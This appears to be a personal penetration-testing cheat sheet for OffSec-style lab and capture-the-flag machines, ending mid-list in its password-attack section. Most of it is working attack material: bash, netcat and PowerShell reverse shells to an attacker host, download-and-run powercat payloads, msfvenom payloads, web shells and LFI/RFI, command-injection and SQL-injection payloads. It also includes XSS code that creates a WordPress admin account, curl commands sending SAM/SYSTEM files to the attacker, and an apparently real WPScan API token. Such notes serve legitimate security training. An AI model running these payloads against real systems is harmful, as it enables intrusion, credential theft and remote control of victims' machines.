- [Capture the flag](#capture-the-flag)
- [Penetration testing methodology](#penetration-testing-methodology)
- [Reverse shell](#reverse-shell)
- [Encode-Decode-Hash](#encode-decode-hash)
- [Files transfer](#files-transfer)
- [Web application attack](#web-application-attack)
- [Password attack](#password-attack)
- [Windows priviledge](#windows-priviledge)
- [Linux priviledge](#linux-priviledge)  
- [Public exploit](#Public-exploit)  
- [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
- [Check/kill ports and containers](#check/kill-ports-and-containers)
- [Kali built in wordlist and payloads](#kali-built-in-wordlist-and-payloads)
- [Top tools and command](#top-tools-and-command)

# Capture the flag 
- Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`  
  - Linux
    - `find / -name "local.txt" 2>/dev/null`  
    - `cat /home/<username>/local.txt`  
    - `cat /root/proof.txt`  
  - Windows
    - `PS C:\users> Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue`  
    - `C:\Windows\system32> where /r C:\ flag.txt`   
    - `type C:\Users\<username>\Desktop\local.txt`  
    - `type C:\Users\Administrator\Desktop\proof.txt`
      
# Penetration testing methodology
1. Identify in-scope hosts: servers, workstations, network devices
1. Info gathering (passive or active): org infra, assets, personnel
   - WHOIS: registrar info, domain owner, nameserver, contract emails
     - `whois example.com` `whois 192.168.1.100`
   - DNS: find hostname, subdomains, zone transfer
     - `nslookup example.com` `host -t txt megacorpone.com`
   - Public resources: LinkedIn, GitHub, Shodan, Google search
   - active recon: nmap for host discovery, ports, service, version, banner grabbing
     - Quick top-ports-scan  
       `nmap -T4 --top-ports 1000 -sV -oN quick_tcp.txt <IP> --open`  
     - **Full TCP scan**   
       🔍 `nmap -p- -sV -oN full_tcp.txt <IP> --open`  
     - UDP scan (53 DNS, 69 TFTP, 123 NTP, 137/138 NetBIOS, 161 SNMP, 500 IKE/IPSec)    
       `nmap -sU --top-ports 100 -oN top100_udp.txt <IP> --open`  
       `nmap -sU -p- -oN full_udp.txt <IP>`  
     - Combined TCP & UDP  
       `nmap -sS -sU --top-ports 100 -oN top_tcp_udp.txt <IP> --open`
     - check for port open  
       `sudo nmap -sS -p 139,445 192.168.165.0/24 --open`  
   - protocols
     - SSH
       - connect to the victim
         `ssh -i <private_key_file> <user>@<target>`  
         `ssh -p <port> <user>@<target>`  
     - FTP
       - `ftp -A <target>` #login with anonymous credentialss
         ```
         #upload
         ftp> binary
         ftp> put [binary_file]

         #download
         ftp> get test.txt
         ```  
     - SMB  
       - **enumerate users, groups, shares, OS info, password policy**  
         🔍 `enum4linux -a <IP> > SMB_enum_users.txt`  
       - scan for vulnerabilities  
         `nmap --script=smb-vuln* -p445 <IP>`
       - List shares  
         `smbclient -L //<IP> -N` (anonymous)  
         `smbclient -L //<IP> -U <user>` (with credentials)  
         `net view \\dc01 /all`  (domain controller)   
     - SMTP
       - user enumeration  
         `nmap --script=smtp-commands,smtp-enum-users -p25 <IP>`
       - verify user  
         `nc -nv <target> 25` `VRFY root`  
     - SNMP  
       - enumerate all MIB tree of SNMPv1  
         `snmpwalk -c public -v1 -t 5 <target>`
1. Web application recon
   - ❗**Edit hosts and access the site by hostname** (show the actual site instead of default page)      
     `sudo nano /etc/hosts`  
     192.168.126.13    intranet.local
   - Software and tech   
     `whatweb http://<IP>`  
     `curl -I http://<IP>`  
   - Enum directory  
     `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t5`
   - Enum API
     pattern  
     ```
     {GOBUSTER}/v1
     {GOBUSTER}/v2
     ```
     `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`  
   - Web data  
     `curl http://<IP>/robots.txt`
     `curl http://<IP>/sitemap.xml`  
   - Vulnerabilities   
     `nikto -h http://<IP>`  
     `wpscan --url http://<host> --api-token s8gfYK1htkmv3IBDVvsncVJjYYT6PSbAf7n3EeaA3oc` [API token]
     (https://wpscan.com/api/)
       - Update wpscan DB `wpscan --update`  
       - Find "Unauthenticated RCE"  
       - Test "jection" manually  
       - If only XSS --> move on unless privilege escalation is possible  
1. Vulnerability detection
   - Identify unpatched services (E.g: SMB, RDP, Apache, MySQL)
   - Check for default/weak credentials
   - automated scanners: nmap --script vuln, nikto, wpscan
   - manual verification: test SQLi, LFI/RFI, command injection, file upload functionality
   - tools: nmap, AutoRecon
   - NSE vulnerability script  
     `sudo nmap -sV -p 443 --script "vuln" <target>`  
1. Initial foothold    
   - Exploit vulnerable service: SMB, FTP, RDP, SSH
   - web fuzzing: Feroxbuster, WFUF, Burp
   - Web exploitation: SQLi → shell upload, RCE
   - Credential reuse / default creds  
   - tools: nc, curl, wget, hydra, gobuster
   - password cracking: John, Hashcat, Hydra  
1. Privilege escalation
   - Linux (LinPEAS)
     - Kernel exploits `searchsploit`
     - SUID/SGID binaries `find / -perm -4000 -type f 2>/dev/null`
     - Misconfigured sudoers or cron jobs
     - Password reuse (from .ssh, history, config files)  
   - Windows (WinPEAS)
     - Weak ACLs / unquoted service paths
     - Vulnerable software (MS17-010 / EternalBlue)
     - Token impersonation (Mimikatz)
     - Cached creds or saved passwords (ntds.dit, SAM/SYSTEM)
     - Enumerate both local & domain privileges
1. Lateral movement
   - Windows: Pass-the-Hash, Kerberos attacks, RDP, SMB, WMI
   - Linux: SSH key reuse, weak passwords, cron jobs
   - Pivoting via compromised host (ligolo-ng, Impacket, CME, Chisel, proxychains, ssh -L, socat)    
1. Report
   - Scope & methodology
   - Hosts discovered and services.
   - Vulnerabilities and exploitation steps.
   - Evidence (screenshots, file hashes, flags).
   - Recommendations for mitigation
     - Patch systems, close unused ports/services
     - Enforce strong passwords and multi-factor authentication
     - Limit user privileges (principle of least privilege)
     - Monitor for suspicious activity and audit logs
     - Network segmentation and firewall rules

# ❗Reverse shell  
Kali port:
80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)    
8080 (burp suite)  
8888 (WebDAV shared)  
8000 (Powercat/Python)  

[Reverse Shell Generator](https://www.revshells.com/)
 - Linux `echo $0`  
    - /bin/sh  
    - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
    - Restricted sh/command injection/web param: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`  
    - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
  - Windows `echo %COMSPEC%`  
    - cmd.exe  
    - ❗ Windows with PowerShell:
      `powercat -c <KALI_IP> -p 4444 -e powershell`
      ```
      #Kali
      cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
      python3 -m http.server 80

      #Target mand injection
      curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.170/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:8000/archive  
      ```
    - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
  - Bypassing web applications (Command injection)
    1. create shell.ps1 on kali
       ```
       $client = New-Object System.Net.Sockets.TCPClient("<kali>",4444)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        while($true){
          $command = $reader.ReadLine()
          if($command -eq "exit"){break}
          $output = (Invoke-Expression $command 2>&1 | Out-String)
          $writer.WriteLine($output)
          $writer.Flush()
        }
        $client.Close()
       ```
    3. Start listener `nc -lvnp 4444`
    4. Execute the encoded payload on target
       - ?page
         `powershell -EncodedCommand <Base64EncodedString>`
       - RCE
          ```
          $payload = "powershell -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')"""
          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
          powershell -EncodedCommand $encoded
          ```
     5. Get reverse shell successfully   
- PHP injection/ ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
  - aspx: cmdasp.aspx
  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
- File upload allowed  
  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
  **step 3 generate payload based on target platform**  
  - windows32: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
  - windows64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`
- check if the port is open (FW might block)  
  `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`  
- Kali listener
  `nc -lvnp 443`
    
**Tips:**  
  - Always match LPORT between payload and nc  
  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
# Encode-Decode-Hash    
- Base64 for web: [CyberChef](https://gchq.github.io/CyberChef/)  
- Hash identify: [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/)  
- Hash identify: [hashcat example](https://hashcat.net/wiki/doku.php?id=example_hashes)  
- Hash tracker: [CrackStation](https://crackstation.net/)  
- Base64 encoded: `b2Zmc2VjMTIzIQ==`  
- common hash types  
  `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo4.rule --force`  
  `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  `hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force`    
  `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`   
  `hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  - Linux
    - md5crypt ($1$) -m 500 `$1$28772684$iEwNOgGugqO9.bIz5sk8k/`  
    - phpass / WordPress ($P$) -m 400 `$P$984478476IagS59wHZvyQMArzfx58u.`  
    - OpenSSH Private Key ($sshng$6$) -m 22921 `$sshng$6$8$7620048997557487....`  
  - Windows
    - **NTLM -m 3000** `b4b9b02e6f09a9bd760f388b67351e2b`  
    - **LM -m 3000** `299bd128c1101fd6`  
    - NetNTLMv2 -m 5600 `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c78303100000`  
    - Kerberos 5 AS-REP (etype 23) ($krb5asrep) -m 18200 `$krb5asrep$23$user@domain.com:3e156ada591263b8aa`  
    - Kerberos 5 TGS-REP (etype 23) ($krb5tgs) -m 13100 `$krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31d0`  
  - Application
    - **MD5 -m 0** `8743b52063cd84097a65d1633f5c74f5` (32 hex)  
    - **SHA-1 -m 100** `b89eaac7e61417341b710b727768294d0e6a277b` (40 hex)  
  - DB
    - KeePass -m 13400 ($keepass$*1) `$keepass$*1*50000*0*375756b9e6c72891a8e5645a3338b8c`  
    - Atlassian (PBKDF2-HMAC-SHA1) -m 12001 `{PKCS5S2}NzIyNzM0NzY3NTIwNjI3MdDDis7wPxSbSzfFqDGf7u/L00kSEnupbz36XCL0m7wa`  

# Check/kill ports and containers  
- Ports
  - List all listening ports `sudo netstat -tulnp`  
  - check port usage `sudo lsof -i :<port>`  
  - kill port `sudo kill -9 <PID>`  
- Containers
  - List running docker containers `docker ps`
  - Stop a docker container `docker stop <container_id>`
  - Remove a docker `docker rm <container_id>`  

# Files transfer 
[PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
 
- **Window**
  - **Transfer back/forth to Windows target**
    ```
    #RDP mounting shared folder
    xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share
    rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>

    ###To target Windows###
    ##iwr kali web server
    cd /var/www/html
    sudo python3 -m http.server 80
    nc <target> <port>
    iwr -uri http://<kali>/<program> -Outfile <program>

    ##Certutil
    certutil -urlcache -f http://<Kali-IP>/file.exe file.exe

    ##SQL
    EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://<kali>:1234/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'
    
    ###From Windows (netcat) to Kali###
    ##UploadServer
    --Kali terminal
    mkdir -p /home/kali/uploads
    cd /home/kali/uploads
    pipx install uploadserver
    pipx run uploadserver --directory /home/kali/uploads 8008

    --target terminal
    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\sam"
    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\system"
    curl -X POST http://<kali>:8008/upload -F "files=@C:\Users\<user>\winPEAS-results.txt"
    ```
  - **C:\Windows\System32\config\SAM**
  - **C:\Windows\System32\config\SYSTEM**
  - C:\Windows\System32\config\SECURITY
  - C:\Windows\NTDS\ntds.dit
  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`**
  - LSASS memory dump `lsass.dmp`
  - plaintext creds: C:\Windows\Panther\Unattend.xml, C:\Windows\sysprep\sysprep.inf
  - task scheduler XML files: C:\Windows\System32\Tasks\
  - **User data: C:\Users\<user>\Desktop, C:\Users\<user>\Documents**
  - **Flag: local.txt, proof.txt**

- **Linux**
  - **Transfer back/forth to Linux target**
    ```
    ###To target Linux###
    scp <linpeas.sh> <user>@<target>:/tmp/
    scp -P 2222 <linpeas.sh> <user>@<target>:/tmp/
   
    ###From Linux to Kali###
    scp <user>@<target>:/tmp/output.txt /home/kali/share/results/
    scp -P 2222 <user>@<target>:/tmp/output.txt /home/kali/share/results/
    ```
  - **SSH keys**
    - ~/.ssh/id_rsa → private key
    - ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519
    - ~/.ssh/authorized_keys  
  - **Password and shadow files**
    - /etc/passwd → user accounts
    - /etc/shadow → hashed passwords (requires root)
  - **User Data**
    - /home/<user>/Desktop/*
    - /home/<user>/Documents/*
    - local.txt, proof.txt
  - **Sensitive files for privilege escalation**
    - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
    - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
  
# Web application attack  
- **Cross-site scripting**
  - ⚠️ **Goal: steal cookies, CSRF admin request**  
  - Inspect: search boxes, comment fields, username/password, contact form, URL param, HTTP headers (referer, user-agent) 
  - Check how values rfected without proper sanitization
    ```
    <script>alert(1)</script>  
    "><script>alert(1)</script>  #inside-html tag
    " onmouseover=alert(1) x=" #inside attribute
    ';alert(1);// #inside JS

    #bypass
    &lt;script&gt;alert(1)&lt;/script&gt;
    <ScRiPt>alert(1)</sCrIpT>
    <img src=x onerror=alert(1)>
    %3Cscript%3Ealert(1)%3C/script%3E
    ```
  - Input accepts unsanitized input < > ' " { } ;  
  - Fuzz: `wfuzz -w payloads/xss.txt -d "name=FUZZ&msg=test" http://target.com/contact.php` 
  - Testing vulnerability by using payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
  - Create new user and privilege via XSS (user-agent vulnerable field)  
    1. run this function and get the encoded js
       ```
         function encode_to_javascript(string) {
              var input = string
              var output = '';
              for(pos = 0; pos < input.length; pos++) {
                  output += input.charCodeAt(pos);
                  if(pos != (input.length - 1)) {
                      output += ",";
                  }
              }
              return output;
          }
          
        let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
        console.log(encoded)
       ```
    2. Intercept the burp request GET / and modify the user-agent    
       `<script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>`
    3. Login to wp-admin/admin.php > Visitors plugin  
    4. Go to users menu and new user "attacker" created  
  - Embeds a web shell in wordpress plugin and RCE command from url  
    ```
    https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
    nano webshell.php
    zip webshell.zip webshell.php
    Upload plugin.zip and activate
    http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null: find flag
    http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag
    ```
- **Directory traversal**
  - ⚠️ **Goal: access credentials/store ssh private key by using relative paths**  
    `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
    `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
  - Inspect: url?**page=**xxx
  - **Connect SSH from stolen private key**
    ```
    curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/<username>/.ssh/id_rsa -o dt_key
    chmod 400 dt_key
    ssh -i dt_key -p 2222 offsec@mountaindesserts.com
    ```
- **Local file inclusion (LFI)**
  - ⚠️ **Goal: load system files and RCE via log file**   
    `http://target.com/index.php?page=../../../../etc/passwd`
  - Inspect: url?**page=**xxx
  - Include the log file via LFI (write sys cmd to access.log file)
    1. Map env (server & log paths)
       **Linux/Apache: /var/log/apache2/access.log or /var/log/httpd/access_log**
       Windows (XAMPP/Apache): C:\xampp\apache\logs\access.log  
    3. Test log inclusion in header (User-Agent)      
       `<?php echo system($_GET['cmd']); ?>`
       `http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id`  
    5. start netcat listener from kali   
       `nc -nvlp 4444`
    6. URL encoding to bypass bad request error   
       `../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la`
    7. Include 💣 **reverse shell**    
       `bash -i >& /dev/tcp/<kali>/4444 0>&1` #bash  
       `bash -c "bash -i >& /dev/tcp/<kali>/4444 0>&1"` #bourne shell (sh)  
       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding
  - PHP wrappers  
    - encode the PHP snippet into base64  
      `kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64`  
    - execute system command  
      `kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
- **Remote file inclusion (RFI)**   
  - ⚠️ **Goal: load malicious PHP payload from kali**    
  - Inspect: url?**page=**xxx  
  - start kali webshells  
    `kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80`  
  - exploit RFI  
    `curl "http://mountaindesserts.com/meteor/index.php?page=http://<kali>/simple-backdoor.php&cmd=ls"` OR
    `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`      
- **File upload vulnerabilities**    
  - Goal  
    - ⚠️ **upload and execute web shell/RCE-->revere shell**    
    - Upload SSH key into ~/.ssh/authorized_keys   
    - upload malicious xss (stored XSS)  
  - Inspect: file upload input, request param ?file=upload, API endpoints (upload.php, file_upload)  
  - Bypass
    - ❗**filename extensions**: .pHP, .phps, .php7, .pHP, .php5, .phtml
    - double extensions: shell.php.jpg, shell.php;.jpg  
    - MIME manipulation: Content-Type: image/png but payload is PHP
    - null byte injection: `shell.php%00.jpg`
  - Upload an executable files
    - nano /var/www/html/php-reverse-shell.php (change to kali ip and/or port)
    - `curl http://<target>/php-reverse-shell.php`  
  - 💣 get **reverse shell**  
    1. start netcat listener from kali  
       `nc -nvlp 4444`
    2. Execute webshell command  
       `curl http://<target>/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
    3. Use Kali's PowerShell to generate encoded reverse shell one-liner
       ```
       kali@kali:~$ pwsh
     
       PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

       PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)  
       PS> $EncodedText =[Convert]::ToBase64String($Bytes)  
       PS> $EncodedText
       ...
       PS> exit
       ```
    5. Using curl to send the base64 encoded reverse shell oneliner  
       ```
       curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0... AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
       ```
  - **Overwrite the authorized keys**
    1. Generate local private keys in kali
       ```
       kali@kali:~$ ssh-keygen
       Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
       cat fileup.pub > authorized_keys
       ```
    3. modify the filename (relative path) in burp request  
       `filename="../../../../../../../root/.ssh/authorized_key"` 
    4. Connect to SSH  
       `kali@kali:~$ rm ~/.ssh/known_hosts`  
       `kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com`  
- **Command injection**
  - ⚠️ **Goal: execute web shell/RCE-->revere shell**
  - Inspect: ?page=, ?id=, ?cmd=
  - Detect payloads:
    ```
    ; id
    && id
    $(id)
    `id`
    ```
    `(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell`          
    `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>:8000/archive` #send url encoding
  - Url encode chrs
    ```
    "     %22
    &     %26
    space +
    ```
  - 💣 Linux: Bash reverse shell  
    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa="&&bash -c 'bash -i >& /dev/tcp/<kali>/4444 0>&1'""`  
    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/<kali>/4444+0>%261'%22"`  
  - 💣 Windows: Powercat    
    1. serve Powercat via Python web server  
       `kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
    3. start web server  
       `kali@kali:~$ python3 -m http.server 80`  
    5. start netcat listener on port 4444  
       `kali@kali:~$ nc -nvlp 4444`
    7. Download Powercat and create a reverse shell via command injection
       `Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell`  > send encoding payload  
       `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`

- **SQL injection attacks**
  - connect DB  
    MYSQL: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`  
    MSSQL: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
  - SQLMap
    `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`  
  - simple payloads
    - error
      `' OR 1=1 --`  
      `' or 1=1 in (select @@version) -- //`  
    - union based  
      `' UNION SELECT null, username, password, description, null FROM users -- //`  
    - booloan
      `offsec' AND 1=1 -- //`
    - time-based
      MySQL: `offsec' AND IF (1=1, sleep(3),'false') -- //`  
      MSSQL: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
      Postgresql: `' AND 3176=(SELECT 3176 FROM PG_SLEEP(5))-- HlYW`
  - ❗**PostgreSQL: COPY … TO PROGRAM**  
    `<PARAM>=1'; COPY (SELECT '') TO PROGRAM 'bash+-c+"bash+-i+>%26+/dev/tcp/<kali>/80+0>%261"`
  - ❗**MySQL: SELECT … INTO OUTFILE**  
     `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
     `<target>/tmp/webshell.php?cmd=id`  
  - ❗**MSSQL: xp_cmdshell**
    sql probe: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`
    
    [nc64.exe】(https://github.com/int0x33/nc.exe/blob/master/nc64.exe)  
    ```
    (kali㉿kali)-[/var/www/html]
    └─$ sudo python3 -m http.server 80

    ';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
    ';EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe c:/windows/temp/nc64.exe";--
    ';EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe <kali> 4444 -e C:\Windows\System32\cmd.exe";--
    ```    
  - Bind reverse shell (powershell -e)
    - Generate Base64 in kali or https://www.revshells.com/ (PowerShell #3 Base64)  
      ```
      pwsh

      $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName  System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)
      $EncodedText
      ```
    - `'; EXECUTE xp_cmdshell 'powershell -e <base64>'; --`  
  - upload a PHP Backdoor from SQL  
    `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
    `192xxx/tmp/webshell.php?cmd=id`  

# Public exploit  
- Search exploit by service + version  
  `searchsploit vsftpd 2.3.4`
  `searchsploit remote smb microsoft windows`
- select "Remote Code Execution"  
- common search words
  E.g: proftpd 1.3.5, joomla rce, kernel 5.x, samba, apache 2.4.49 rce,  ms17_010, windows iis rce, searchsploit linux kernel 5.4, CVE-2017-0144, windows local privilege escalation  
- Copy exploit locally    
  `searchsploit -m 12345.c`
- Fixing/Modifying exploits
  - change IP/port for reverse shell
  - adjust target path in web RCE
  - modify payload type cmd.exe, powershell, /bin/bash
- software version: qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)
  - `searchsploit qdPM 9.1`: php/webapps/50944.py  
  - `searchsploit -m 50944`  
  - `python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp`
  - `curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"`  
- **.c program** need compile to .exe
  - `searchsploit "Sync Breeze Enterprise 10.0.28"`: windows/dos/42341.c
  - modify the 42341.c (ip, port, target, shellcode)  
  - Compiling the exploit: `kali@kali:~ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`      
  - setting up a Netcat listener on port 443: `kali@kali:~$ sudo nc -lvp 443`  
  - Running the final version of the exploit: `kali@kali:~ sudo wine syncbreeze_exploit.exe`  
- **Upload**: WiFi Mouse 1.7.8.5 - Remote Code Execution
  - `searchsploit "mouse server"`: windows/remote/50972.py
  - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
  - start webserver, and listener
  - `python3 mouseserver_50972.py <target> <kali> shell64.exe`  
- **Bash script**: Apache httpd 2.4.49 - Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
  - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh  
  - start listener   
  - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`  
- **Python execute directly**: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution    
  - modify 44976.py (credentials, url, verify=false)    
  - `python2 44976.py`  
  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`    

# Password attack  
- SSH  
  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`
- RDP  
